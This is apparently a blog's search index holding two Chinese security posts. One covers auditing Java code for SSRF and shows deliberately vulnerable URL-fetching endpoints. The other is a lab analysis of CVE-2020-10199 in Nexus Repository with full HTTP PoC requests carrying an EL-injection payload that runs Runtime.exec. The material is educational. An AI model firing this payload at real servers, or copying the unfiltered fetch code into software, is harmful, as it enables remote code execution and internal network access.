<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java代码审计之SSRF</title>
      <link href="/2022/11/30/java-dai-ma-shen-ji-zhi-ssrf/"/>
      <url>/2022/11/30/java-dai-ma-shen-ji-zhi-ssrf/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当没人知道你在干嘛时，生活会变得更好。</p><h2 id="0x01-SSRF？"><a href="#0x01-SSRF？" class="headerlink" title="0x01 SSRF？"></a>0x01 SSRF？</h2><p>​        SSRF（Server-Side Request Forgery）服务端请求为伪造，它是一种由攻击者构造恶意请求形成由服务端发起请求的一个安全漏洞。一般情况下，由于SSRF漏洞是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统，因此它的目标是从外网无法访问的内部系统。通过访问内部系统来获取敏感数据，严重可获取服务器权限。</p><h2 id="0x02-常见漏洞接口"><a href="#0x02-常见漏洞接口" class="headerlink" title="0x02 常见漏洞接口"></a>0x02 常见漏洞接口</h2><p>以下几种是在java中能发起HTTP请求的方法，在代码审计中需要特别留意</p><pre><code>HttpURLConnection.getInputStreamURLConnection.getInputStreamHttpClient.executeOkHttpClient.netCall.executeRequest.Get.executeRequest.Post.executeURL.openStreamImageIO.read</code></pre><p>以上方法均可以发起网络请求，但是支持sun.net.<a href="http://www.protocol下所有协议的,只有urlconnection和url./">www.protocol下所有协议的，只有URLConnection和URL。</a></p><h3 id="1、HttpURLConnection"><a href="#1、HttpURLConnection" class="headerlink" title="1、HttpURLConnection"></a>1、HttpURLConnection</h3><p>HttpURLConnection是java的标准类，它继承于URLConnection，可用于向url发送http请求，在没有任何过滤的情况下会导致SSRF的产生。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/HttpURLConnection/vul"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">httpURLConnection</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        URL u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        URLConnection urlConnection <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HttpURLConnection httpUrl <span class="token operator">=</span> <span class="token punctuation">(</span>HttpURLConnection<span class="token punctuation">)</span>urlConnection<span class="token punctuation">;</span>        BufferedReader in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>httpUrl<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String inputLine<span class="token punctuation">;</span>        StringBuffer html <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inputLine <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span><span class="token punctuation">{</span>            html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>inputLine<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> html<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SSRFException</span> <span class="token operator">|</span> IOException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、URLConnection"><a href="#2、URLConnection" class="headerlink" title="2、URLConnection"></a>2、URLConnection</h3><p>URLConnection是一个抽象类，表示指向URL指定资源的活动链接，除了上面我们提到的HttpURLConnection以外，他还有一个子类是JarURLConnection。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/urlConnection/vuln"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">{</span>RequestMethod<span class="token punctuation">.</span>POST<span class="token punctuation">,</span> RequestMethod<span class="token punctuation">.</span>GET<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">URLConnectionVuln</span><span class="token punctuation">(</span>String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> HttpUtils<span class="token punctuation">.</span><span class="token function">URLConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、HttpClient"><a href="#3、HttpClient" class="headerlink" title="3、HttpClient"></a>3、HttpClient</h3><p>HttpClient是一个高效、功能丰富的客户端编程工具包，在没有任何过滤的情况下，会产生ssrf漏洞。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/httpclient/vul"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">HttpClient</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        client<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>httpGet<span class="token punctuation">)</span><span class="token punctuation">;</span>        BufferedReader in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>client<span class="token punctuation">.</span><span class="token function">execute</span> <span class="token punctuation">(</span>httpGet<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEntity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringBuffer html <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String inputLine <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>inputLine <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span><span class="token punctuation">{</span>            html<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>inputLine<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> html<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SSRFException</span> <span class="token operator">|</span> IOException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、OkHttpClient"><a href="#4、OkHttpClient" class="headerlink" title="4、OkHttpClient"></a>4、OkHttpClient</h3><p>OkHttpClient是java中一个高效的HTTP客户端，在没有任何过滤下可导致ssrf的产生。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/Okhttpclient/vul"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">OkHttpClient</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>    OkHttpClient client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OkHttpClient<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">connectTimeout</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">writeTimeout</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">readTimeout</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Request request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request<span class="token punctuation">.</span>Builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>        Response response <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">newCall</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String responseString <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> responseString<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、Request"><a href="#5、Request" class="headerlink" title="5、Request"></a>5、Request</h3><p>同Python的Request模块一样，也会发起http请求。漏洞代码如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/request/vul"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">request</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String url<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> Request<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">returnContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SSRFException</span> <span class="token operator">|</span> IOException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6、openStream"><a href="#6、openStream" class="headerlink" title="6、openStream"></a>6、openStream</h3><p>通过URL对象的openStream方法，可以得到指定资源的输入流，如果对指定的资源，即传入的url没有加以过滤，则会产生SSRF漏洞。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/openStream"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">openStream</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> String url<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    InputStream inputStream <span class="token operator">=</span> null<span class="token punctuation">;</span>    OutputStream outputStream <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        String downLoadImgFileName <span class="token operator">=</span> WebUtils<span class="token punctuation">.</span><span class="token function">getNameWithoutExtension</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> WebUtils<span class="token punctuation">.</span><span class="token function">getFileExtension</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// download</span>        response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"content-disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;fileName="</span> <span class="token operator">+</span> downLoadImgFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>        URL u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> length<span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        inputStream <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">openStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// send request</span>        outputStream <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            outputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>inputStream <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>outputStream <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            outputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>在java中，ssrf仅支持sun.net.<a href="http://www.protocol下所有的协议,即http、https、file、mailto、jar和netdoc协议.所以java的ssrf并不能和php一样,可以通过gopher协议来扩展攻击面,因此java的ssrf利用方式比较局限.主要有以下两种利用方式/">www.protocol下所有的协议，即http、https、file、mailto、jar和netdoc协议。所以java的ssrf并不能和php一样，可以通过gopher协议来扩展攻击面，因此java的ssrf利用方式比较局限。主要有以下两种利用方式</a></p><pre><code>1、利用file协议任意文件读取;2、利用http协议端口探测。</code></pre><p>SSRF漏洞修复也很简单，主要有以下几点</p><ul><li>正确处理302跳转；</li><li>限制协议只能为http/https，防止跨协议；</li><li>设置内网ip为黑名单；</li><li>在内网防火墙上设置常见的web端口白名单；</li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-10199漏洞分析</title>
      <link href="/2022/11/25/cve-2020-10199-lou-dong-fen-xi/"/>
      <url>/2022/11/25/cve-2020-10199-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>做事，不怕速度慢，只怕原地站。</p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Nexus Repository OSS是一款通用的软件包仓库管理（Universal Repository Manager）服务，在版本为&lt;= 3.21.1时，攻击者可以通过<code>/service/rest/beta/repositories/go/group</code>接口(至少需要一个低权限以上的账号才能访问)来构造恶意的数据，在渲染数据时造成EL表达式注入，导致可远程执行任意命令，该漏洞在3.21.2被修复。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>1、拉取镜像</p><pre><code>docker pull sonatype/nexus3:3.21.1</code></pre><p>2、启动镜像</p><pre><code>ocker run -d -p 8081:8081 -p 8000:8000 --name nexus -e INSTALL4J_ADD_VM_PARAMS=&quot;-Xms2g -Xmx2g -XX:MaxDirectMemorySize=3g -Djava.util.prefs.userRoot=$&#123;NEXUS_DATA&#125;/javaprefs -Dstorage.diskCache.diskFreeSpaceLimit=1024 -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000&quot; sonatype/nexus3:3.21.0</code></pre><p>这里的8081是web端口，8000是JDWP调试端口映射。</p><p>3、idea远程debug</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221125232139782.png"></p><p>下载nexus源码</p><pre><code>https://github.com/sonatype/nexus-public/archive/refs/tags/release-3.21.0-05.zip</code></pre><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>初次登录时，账号为admin，密码在/opt/sonatype/sonatype-work/nexus3/admin.password中，复制并修改密码。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221125233241828.png"></p><p>获取数据包中的NX-ANTI-CSRF-TOKEN和NXSESSIONID，并替换到以下poc发送数据包</p><pre><code>POST /service/rest/beta/repositories/go/group HTTP/1.1Host: 192.168.52.130:8081Content-Length: 205accept: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36NX-ANTI-CSRF-TOKEN: 0.9539500051742233Content-Type: application/jsonOrigin: http://192.168.52.130:8081Referer: http://192.168.52.130:8081/swagger-ui/?_v=3.21.0-05&amp;_e=OSSAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: NX-ANTI-CSRF-TOKEN=0.9539500051742233; NXSESSIONID=513ba1d6-3c5b-4fdd-826f-ec4341ddc723dnt: 1sec-gpc: 1Connection: close&#123;  &quot;name&quot;: &quot;internal&quot;,  &quot;online&quot;: true,  &quot;storage&quot;: &#123;    &quot;blobStoreName&quot;: &quot;default&quot;,    &quot;strictContentTypeValidation&quot;: true  &#125;,  &quot;group&quot;: &#123;    &quot;memberNames&quot;: [&quot;$&#123;&#39;root0ER&#39;.toUpperCase()&#125;&quot;]  &#125;&#125;</code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221125233821775.png"></p><p>执行命令</p><pre><code>POST /service/rest/beta/repositories/go/group HTTP/1.1Host: 192.168.52.130:8081Content-Length: 285accept: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36NX-ANTI-CSRF-TOKEN: 0.9539500051742233Content-Type: application/jsonOrigin: http://192.168.52.130:8081Referer: http://192.168.52.130:8081/swagger-ui/?_v=3.21.0-05&amp;_e=OSSAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: NX-ANTI-CSRF-TOKEN=0.9539500051742233; NXSESSIONID=513ba1d6-3c5b-4fdd-826f-ec4341ddc723dnt: 1sec-gpc: 1Connection: close&#123;  &quot;name&quot;: &quot;internal&quot;,  &quot;online&quot;: true,  &quot;storage&quot;: &#123;    &quot;blobStoreName&quot;: &quot;default&quot;,    &quot;strictContentTypeValidation&quot;: true  &#125;,  &quot;group&quot;: &#123;    &quot;memberNames&quot;: [&quot;$&#123;&#39;a&#39;.getClass().forName(&#39;java.lang.Runtime&#39;).getDeclaredMethod(&#39;getRuntime&#39;).invoke(&#39;a&#39;.getClass().forName(&#39;java.lang.Runtime&#39;)).exec(&#39;touch /tmp/success&#39;)&#125;&quot;]  &#125;&#125;</code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221125235052498.png"></p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><h3 id="1、反推法"><a href="#1、反推法" class="headerlink" title="1、反推法"></a>1、反推法</h3><p>首先先来对比下漏洞版本和修复版本的差异，除了可以通过github来对比外，也可以通过Beyond_Compare来对比差异</p><pre><code>https://github.com/sonatype/nexus-public/compare/release-3.21.0-05...release-3.21.2-03?diff=split</code></pre><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126002021117.png"></p><p>可以看到在3.21.2-03版本修复的方式是通过getEscapeHelper().stripJavaEl对数据进行过滤。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126002514577.png"></p><p>如果分析过CVE-2018-16621与CVE-2020-10204的师傅会发现这个漏洞跟前两个cve一样，都是buildConstraintViolationWithTemplate过滤不当导致的EL表达式注入，我们全局搜索下buildConstraintViolationWithTemplate，定位到关键位置为：<code>src/main/java/org/sonatype/nexus/validation/ConstraintViolationFactory</code>，这里没有经过getEscapeHelper().stripJavaEl进行过滤。</p><p>在HelperValidator类的isValid方法调用了buildConstraintViolationWithTemplate</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126005449709.png"></p><p>继续分析发现HelperValidator被注解在HelperAnnotation接口上</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126005655618.png"></p><p>同样，HelperAnnotation注解在HelperBean上</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126005739179.png"></p><p>在第64行构建了HelperBean对象</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126005950292.png"></p><p>因此我们只需要看看谁调用了createViolation即可，全局搜索constraintViolationFactory.createViolation发现，在<code>src/main/java/org/sonatype/nexus/repository/rest/api/AbstractGroupRepositoriesApiResource</code>调用了createViolation</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126010357373.png"></p><p>继续往上跟进，看看哪里调用了validateGroupMembers方法，在<code>src/main/java/org/sonatype/nexus/repository/rest/api/AbstractGroupRepositoriesApiResource.java</code>的第66行调用了validateGroupMembers方法。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126010615528.png"></p><p>同样在<code>src/main/java/org/sonatype/nexus/repository/golang/rest/GolangGroupRepositoriesApiResource.java</code>中的第83行调用了createRepository，路由地址也和poc中给出的路径对上了。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126011227075.png"></p><p>通过这种反推的方式我们可以对比版本间的差异来更快捕获到漏洞点。</p><h3 id="2、正推法"><a href="#2、正推法" class="headerlink" title="2、正推法"></a>2、正推法</h3><p>全局搜索关键路径<code>go/group</code>，定位到相应的java类文件<code>src/main/java/org/sonatype/nexus/repository/golang/rest/GolangGroupRepositoriesApiResource</code>，根据请求方法定位到@POST注解下的createRepository方法，在该处下一个断点。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126024837334.png"></p><p>这里调用了父类的createRepository，跟进到createRepository</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126025149373.png"></p><p>继续跟进到validateGroupMembers，此时memberNames为一个数组，在第86行遍历memberNames中的元素，通过repositoryManager.get(repositoryName)获取仓库名，如果为null，则进行else流程，进入constraintViolationFactory.createViolation，我们跟进去看看</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126025851800.png"></p><p>在第64行新建了一个HelperBean对象，并将poc传入其中，</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126025946164.png"></p><p>逐渐跟进，跟进到validateConstraints方法，跟进addConstraintFailure</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126014656625.png"></p><p>在addConstraintFailure中，通过constraintViolationCreationContext.getMessage()获取我们的EL表达式，然后传递到interpolate方法执行表达式，我们跟进到interpolate中</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126014914374.png"></p><p>跟进到this.validatorScopedContext.getMessageInterpolator().interpolate中</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126015909067.png"></p><p>继续跟进到interpolateMessage</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126015956031.png"></p><p>后面一步步跟进后，会调用<code>org\hibernate\validator\hibernate-validator\6.1.0.Final\hibernate-validator-6.1.0.Final.jar!\org\hibernate\validator\internal\engine\messageinterpolation\ElTermResolver</code>的interpolate方法，在第39行进行渲染完成RCE。</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221126021010095.png"></p><h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><p><a href="https://paper.seebug.org/1166/#cve-2020-10199">https://paper.seebug.org/1166/#cve-2020-10199</a></p><p><a href="https://xz.aliyun.com/t/8299#toc-11">https://xz.aliyun.com/t/8299#toc-11</a></p><p><a href="https://www.cnblogs.com/magic-zero/p/12641068.html">https://www.cnblogs.com/magic-zero/p/12641068.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp SSRF插件开发</title>
      <link href="/2022/11/23/burp-ssrf-cha-jian-kai-fa/"/>
